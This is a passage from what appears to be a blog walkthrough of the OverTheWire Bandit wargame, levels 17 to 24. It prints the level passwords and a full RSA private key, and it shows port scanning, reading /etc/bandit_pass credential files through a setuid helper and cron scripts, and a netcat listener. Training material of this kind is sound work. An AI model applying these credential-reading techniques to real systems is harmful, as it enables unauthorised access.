Stats: 0:01:23 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
Service scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 17:54 <span style="color:#f92672">(</span>0:01:23 remaining<span style="color:#f92672">)</span>
Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.00013s latency<span style="color:#f92672">)</span>.
PORT      STATE SERVICE     VERSION
31518/tcp open  ssl/echo
31790/tcp open  ssl/unknown
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31790-TCP:V<span style="color:#f92672">=</span>7.40%T<span style="color:#f92672">=</span>SSL%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/29%Time<span style="color:#f92672">=</span>5D17893D%P<span style="color:#f92672">=</span>x86_64-pc-linux-g
SF:nu%r<span style="color:#f92672">(</span>GenericLines,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the\x20correct\x20cu
</span><span style="color:#e6db74">SF:rrent\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the
</span><span style="color:#e6db74">SF:\x20correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,31,<span style="color:#e6db74">&#34;Wrong!\x20Plea
</span><span style="color:#e6db74">SF:se\x20enter\x20the\x20correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,
SF:31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\
</span><span style="color:#e6db74">SF:n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x
</span><span style="color:#e6db74">SF:20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the\x20
</span><span style="color:#e6db74">SF:correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,31,<span style="color:#e6db74">&#34;Wrong!\x20Please
</span><span style="color:#e6db74">SF:\x20enter\x20the\x20correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,31,<span style="color:#e6db74">&#34;W
</span><span style="color:#e6db74">SF:rong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r
SF:<span style="color:#f92672">(</span>FourOhFourRequest,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the\x20correct\x20c
</span><span style="color:#e6db74">SF:urrent\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the
</span><span style="color:#e6db74">SF:\x20correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,31,<span style="color:#e6db74">&#34;Wrong!\x20Pl
</span><span style="color:#e6db74">SF:ease\x20enter\x20the\x20correct\x20current\x20password\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions
SF:,31,<span style="color:#e6db74">&#34;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password
</span><span style="color:#e6db74">SF:\n&#34;</span><span style="color:#f92672">)</span>;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 88.36 seconds
</code></pre></div><p>(This scan might take a bit)</p>
<p>Ok so both of them speak SSL, but one of them is an <code>echo</code> service as we can see. This was an overkill since we could&rsquo;ve just tried both, but now you know how to do it properly (imagine if you had 300 ports). The port we want is <strong>31790</strong>, lets submit the password using <strong>openssl s_client</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit16@bandit:~$ openssl s_client -connect localhost:31790
<span style="color:#f92672">(</span>...bunch of ssl information...<span style="color:#f92672">)</span>
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY<span style="color:#f92672">=</span>
-----END RSA PRIVATE KEY-----

closed
</code></pre></div><p>Now we have an ssh key we can copy it to our own computer to a file and use it to connect like we did in <a href="#level-14">Level 14</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">myuser@myuser:~$ echo <span style="color:#e6db74">&#34;-----BEGIN RSA PRIVATE KEY-----
</span><span style="color:#e6db74">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
</span><span style="color:#e6db74">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
</span><span style="color:#e6db74">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
</span><span style="color:#e6db74">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
</span><span style="color:#e6db74">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
</span><span style="color:#e6db74">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
</span><span style="color:#e6db74">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
</span><span style="color:#e6db74">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
</span><span style="color:#e6db74">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
</span><span style="color:#e6db74">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
</span><span style="color:#e6db74">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
</span><span style="color:#e6db74">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
</span><span style="color:#e6db74">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
</span><span style="color:#e6db74">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
</span><span style="color:#e6db74">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
</span><span style="color:#e6db74">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
</span><span style="color:#e6db74">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
</span><span style="color:#e6db74">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
</span><span style="color:#e6db74">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
</span><span style="color:#e6db74">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
</span><span style="color:#e6db74">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
</span><span style="color:#e6db74">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
</span><span style="color:#e6db74">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
</span><span style="color:#e6db74">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
</span><span style="color:#e6db74">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
</span><span style="color:#e6db74">-----END RSA PRIVATE KEY-----&#34;</span> &gt; level17_priv

myuser@myuser:~$ ssh bandit17@bandit.labs.overthewire.org -p <span style="color:#ae81ff">2220</span> -i level17_priv
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions <span style="color:#ae81ff">0664</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;level17_priv&#39;</span> are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key <span style="color:#e6db74">&#34;level17_priv&#34;</span>: bad permissions
bandit17@bandit.labs.overthewire.org<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
</code></pre></div><p>Hmmm&hellip; It makes sense we shouldn&rsquo;t just have a private key laying around unprotected let&rsquo;s change its permissions (you can google how permissions in linux work).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">myuser@myuser:~$ sudo chmod <span style="color:#ae81ff">600</span> level17_priv
myuser@myuser:~$ ssh bandit17@bandit.labs.overthewire.org -p <span style="color:#ae81ff">2220</span> -i level17_priv
<span style="color:#f92672">(</span>...connection established info...<span style="color:#f92672">)</span>
bandit17@bandit:~$ 
</code></pre></div><p>Success! Just in case we should go get this level&rsquo;s password so we don&rsquo;t need the private key to login. The passwords are located in <code>/etc/bandit_pass/</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
</code></pre></div><p>Now we can go to the next one.</p>
<h2 id="level-18">Level 18</h2>
<p>So now the password for the next level is the only line different between <strong>passwords.old</strong> and <strong>passwords.new</strong>. Let&rsquo;s check the <strong>diff</strong> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NAME
       diff - compare files line by line
</code></pre></div><p>This should do it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit17@bandit:~$ diff passwords.old passwords.new 
42c42
&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA
---
&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
</code></pre></div><p>So our password should be the one on the bottom since that&rsquo;s the new one. Next one.</p>
<h2 id="level-19">Level 19</h2>
<p>Now the problem is that once we login we are automatically kicked out</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">myuser@myuser:~$ ssh bandit18@bandit.labs.overthewire.org -p <span style="color:#ae81ff">2220</span>
<span style="color:#f92672">(</span>...connection established info...<span style="color:#f92672">)</span>
Byebye !
Connection to bandit.labs.overthewire.org closed.
myuser@myuser:~$ 
</code></pre></div><p>Hm&hellip; Ok, so what about if we try to run a command through ssh. Instead of opening a connection and get a prompt, just run a command. Well let&rsquo;s check the <strong>man ssh</strong> command</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SYNOPSIS
     ssh <span style="color:#f92672">[</span>-46AaCfGgKkMNnqsTtVvXxYy<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-B bind_interface<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-b bind_address<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-c cipher_spec<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-D <span style="color:#f92672">[</span>bind_address:<span style="color:#f92672">]</span>port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-E log_file<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-e escape_char<span style="color:#f92672">]</span>
         <span style="color:#f92672">[</span>-F configfile<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-I pkcs11<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-i identity_file<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-J destination<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-L address<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-l login_name<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-m mac_spec<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-O ctl_cmd<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-o option<span style="color:#f92672">]</span>
         <span style="color:#f92672">[</span>-p port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-Q query_option<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-R address<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-S ctl_path<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-W host:port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-w local_tun<span style="color:#f92672">[</span>:remote_tun<span style="color:#f92672">]]</span> destination <span style="color:#f92672">[</span>command<span style="color:#f92672">]</span>
</code></pre></div><p>Well as we can see the last argument of the command is a command so let&rsquo;s try it</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">myuser@myuser:~$ ssh bandit18@bandit.labs.overthewire.org -p <span style="color:#ae81ff">2220</span> <span style="color:#e6db74">&#39;cat readme&#39;</span>
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
myuser@myuser:~$ 
</code></pre></div><p>So we got kicked out but we were still able to run the command which gave us the password. NICE! Next one.</p>
<h2 id="level-20">Level 20</h2>
<p>Let&rsquo;s check the challenge description:</p>
<blockquote>
<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), asetuidfter you have used the setuid binary.</p>
</blockquote>
<p>Let&rsquo;s execute it without arguments then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
</code></pre></div><p>We can see which user we are currently running the command by running <strong>whoami</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit19@bandit:~$ whoami
bandit19
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
</code></pre></div><p>So this runs a command as <strong>bandit20</strong>. It should immediately pop to your mind the idea of just using <strong>cat</strong> to print the password as the next user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
</code></pre></div><p>So we ran <strong>cat</strong> as <strong>bandit20</strong> and gave it the file we wanted to print as an argument. This should be easy by now.</p>
<h2 id="level-21">Level 21</h2>
<p>This challenge is really well detailed in the description so i&rsquo;ll just paste it here</p>
<blockquote>
<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
</blockquote>
<p>So we need to run a server on a port that sends the password everytime someone connects to it. So we will need 2 terminals running because the server will hold on to one of them. We can use <strong>screen</strong>. We just need to execute <strong>screen</strong> which will get us into another empty terminal. To detach the current screen just hit <strong>Ctrl+a d</strong>. Then to resume just execute <strong>screen -r</strong> (RTFM on this one). We will also put a job into background by hitting <strong>Ctrl+z</strong> and then running <strong>fg</strong> to bring it to the foreground.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit20@bandit:~$ screen
<span style="color:#f92672">(</span>...enters a new screen session...<span style="color:#f92672">)</span>
bandit20@bandit:~$ nc -l -p <span style="color:#ae81ff">30005</span>
<span style="color:#f92672">(</span>...listening...<span style="color:#f92672">)</span>
</code></pre></div><p>Now we detach the screen session and run <code>./suconnection 30005</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit20@bandit:~$ ./suconnect <span style="color:#ae81ff">30005</span>
<span style="color:#f92672">(</span>...waiting...<span style="color:#f92672">)</span>
</code></pre></div><p>Let&rsquo;s go back to our netcat server and send the old password. Hit <strong>Ctrl+z</strong> to send <code>suconnect</code> to the background and then run <strong>screen -r</strong> to resume the screen session.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit20@bandit:~$ nc -l -p <span style="color:#ae81ff">30005</span>
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
<span style="color:#f92672">(</span>...waiting...<span style="color:#f92672">)</span>
</code></pre></div><p>Ok now finally let&rsquo;s resume our <code>suconnect</code> by exiting screen and running <strong>fg</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit20@bandit:~$ fg
./suconnect <span style="color:#ae81ff">30005</span>
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$ 
</code></pre></div><p>It worked!! Now we just need to go back to the netcat server to get the password received.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit20@bandit:~$ screen -r
<span style="color:#f92672">(</span>...switched to screen session...<span style="color:#f92672">)</span>
bandit20@bandit:~$ nc -l -p <span style="color:#ae81ff">30005</span>
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@bandit:~$ 
</code></pre></div><p>There we go. DONE! This was interesting! Next one.</p>
<h2 id="level-22">Level 22</h2>
<p>A program is running periodically using <strong>cron</strong>. Let&rsquo;s look into <code>/etc/cron.d/</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit21@bandit:~$ ls -la /etc/cron.d
total <span style="color:#ae81ff">24</span>
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> .
drwxr-xr-x <span style="color:#ae81ff">88</span> root root <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> ..
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">120</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> cronjob_bandit22
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">122</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> cronjob_bandit23
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">120</span> Oct <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> cronjob_bandit24
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">102</span> Oct  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2017</span> .placeholder
</code></pre></div><p>The one that interests us for now is <code>cronjob_bandit22</code>. <strong>cat</strong> it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
</code></pre></div><p>So we may not understand this fully, but let&rsquo;s check that file&rsquo;s content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
<span style="color:#75715e">#!/bin/bash</span>
chmod <span style="color:#ae81ff">644</span> /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
</code></pre></div><p>Ok this we can understand. So it&rsquo;s printing out the password for the next level to that file. Let&rsquo;s see if we can <strong>cat</strong> that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
</code></pre></div><p>We got it! Next level.</p>
<h2 id="level-23">Level 23</h2>
<p>This one is pretty much like the previous one but it&rsquo;s a different <strong>cron</strong> job running.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
</code></pre></div><p>So the cronjob is being ran as if it was by user <strong>bandit23</strong>. Let&rsquo;s analyze the file mentioned in here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
<span style="color:#75715e">#!/bin/bash</span>

myname<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span>
mytarget<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo I am user $myname | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f 1<span style="color:#66d9ef">)</span>

echo <span style="color:#e6db74">&#34;Copying passwordfile /etc/bandit_pass/</span>$myname<span style="color:#e6db74"> to /tmp/</span>$mytarget<span style="color:#e6db74">&#34;</span>

cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
</code></pre></div><p>So it prints the password to a directory whose name is generated by the command after <code>mytarget</code>. If we execute the command it should give us the name. We just have to replace <code>$myname</code> with <strong>bandit22</strong>, since that would be the output of running <strong>whoami</strong> as we&rsquo;ve mentioned previously.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span>
8ca319486bfbbc3663ea0fbe81326349
</code></pre></div><p>Now if we <strong>cat</strong> this file we should get the password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
</code></pre></div><p>Done. Onto the next one.</p>
<h2 id="level-24">Level 24</h2>
<p>Let&rsquo;s see this challenge description since they have a few importante notes:</p>
<blockquote>
<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
</blockquote>
<blockquote>
<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
</blockquote>
<blockquote>
<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
</blockquote>
<p>So let&rsquo;s first go to <code>/etc/crond.d/</code> and check this level&rsquo;s file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
</code></pre></div><p><strong>cat</strong> the file mentioned in here</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
